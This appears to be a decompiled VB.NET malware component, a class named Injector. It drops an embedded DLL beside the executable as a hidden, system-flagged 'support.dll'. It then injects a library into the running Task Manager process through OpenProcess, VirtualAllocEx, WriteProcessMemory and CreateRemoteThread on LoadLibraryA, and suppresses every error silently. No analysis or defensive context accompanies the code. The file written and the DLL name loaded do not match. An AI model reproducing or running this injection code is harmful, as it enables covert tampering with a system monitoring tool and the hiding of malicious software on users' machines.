Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Runtime.InteropServices
Imports System.Text
Imports System.Windows.Forms
Imports Main.Properties

Namespace Main.Tools
	' Token: 0x0200001C RID: 28
	Friend Class Injector
		' Token: 0x060000AA RID: 170
		Public Declare Function OpenProcess Lib "kernel32.dll" (dwDesiredAccess As Integer, bInheritHandle As Boolean, dwProcessId As Integer) As IntPtr

		' Token: 0x060000AB RID: 171
		Public Declare Auto Function GetModuleHandle Lib "kernel32.dll" (lpModuleName As String) As IntPtr

		' Token: 0x060000AC RID: 172
		Private Declare Ansi Function GetProcAddress Lib "kernel32" (hModule As IntPtr, procName As String) As IntPtr

		' Token: 0x060000AD RID: 173
		Private Declare Function VirtualAllocEx Lib "kernel32.dll" (hProcess As IntPtr, lpAddress As IntPtr, dwSize As UInteger, flAllocationType As UInteger, flProtect As UInteger) As IntPtr

		' Token: 0x060000AE RID: 174
		Private Declare Function WriteProcessMemory Lib "kernel32.dll" (hProcess As IntPtr, lpBaseAddress As IntPtr, lpBuffer As Byte(), nSize As UInteger, <System.Runtime.InteropServices.OutAttribute()> ByRef lpNumberOfBytesWritten As UIntPtr) As Boolean

		' Token: 0x060000AF RID: 175
		Private Declare Function CreateRemoteThread Lib "kernel32.dll" (hProcess As IntPtr, lpThreadAttributes As IntPtr, dwStackSize As UInteger, lpStartAddress As IntPtr, lpParameter As IntPtr, dwCreationFlags As UInteger, lpThreadId As IntPtr) As IntPtr

		' Token: 0x060000B0 RID: 176 RVA: 0x00007A20 File Offset: 0x00005C20
		Public Shared Sub Inject_Dll()
			Try
				Dim kernelbas As Byte() = Resources.kernelbas32
				Using fileStream As FileStream = New FileStream(Path.GetDirectoryName(Application.ExecutablePath) + "\support.dll", FileMode.OpenOrCreate)
					fileStream.Write(kernelbas, 0, kernelbas.Length)
					File.SetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\support.dll", File.GetAttributes(Path.GetDirectoryName(Application.ExecutablePath) + "\support.dll") Or FileAttributes.Hidden Or FileAttributes.System)
				End Using
				Dim process As Process = Process.GetProcessesByName("Taskmgr")(0)
				Dim intPtr As IntPtr = Injector.OpenProcess(1082, False, process.Id)
				Dim procAddress As IntPtr = Injector.GetProcAddress(Injector.GetModuleHandle("kernel32.dll"), "LoadLibraryA")
				Dim text As String = "kernelbas32.dll"
				Dim intPtr2 As IntPtr = Injector.VirtualAllocEx(intPtr, IntPtr.Zero, CUInt(((text.Length + 1) * Marshal.SizeOf(GetType(Char)))), 12288UI, 4UI)
				Dim uintPtr As UIntPtr
				Injector.WriteProcessMemory(intPtr, intPtr2, Encoding.[Default].GetBytes(text), CUInt(((text.Length + 1) * Marshal.SizeOf(GetType(Char)))), uintPtr)
				Injector.CreateRemoteThread(intPtr, IntPtr.Zero, 0UI, procAddress, intPtr2, 0UI, IntPtr.Zero)
			Catch ex As Exception
			End Try
		End Sub

		' Token: 0x040000A0 RID: 160
		Private Const PROCESS_CREATE_THREAD As Integer = 2

		' Token: 0x040000A1 RID: 161
		Private Const PROCESS_QUERY_INFORMATION As Integer = 1024

		' Token: 0x040000A2 RID: 162
		Private Const PROCESS_VM_OPERATION As Integer = 8

		' Token: 0x040000A3 RID: 163
		Private Const PROCESS_VM_WRITE As Integer = 32

		' Token: 0x040000A4 RID: 164
		Private Const PROCESS_VM_READ As Integer = 16

		' Token: 0x040000A5 RID: 165
		Private Const MEM_COMMIT As UInteger = 4096UI

		' Token: 0x040000A6 RID: 166
		Private Const MEM_RESERVE As UInteger = 8192UI

		' Token: 0x040000A7 RID: 167
		Private Const PAGE_READWRITE As UInteger = 4UI
	End Class
End Namespace
